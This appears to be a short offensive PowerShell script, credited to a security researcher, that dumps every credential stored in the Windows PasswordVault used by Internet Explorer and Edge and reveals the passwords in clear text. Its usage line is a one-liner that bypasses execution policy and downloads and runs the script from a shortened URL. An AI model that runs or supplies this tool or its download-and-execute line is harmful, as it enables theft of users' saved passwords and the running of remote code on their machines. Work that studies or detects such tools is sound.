# Content: Extract stored credentials from Internet Explorer and Edge
# Author: Florian Hansemann | @HanseSecure | https://hansesecure.de
# Date: 04/2018
# Usage: powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
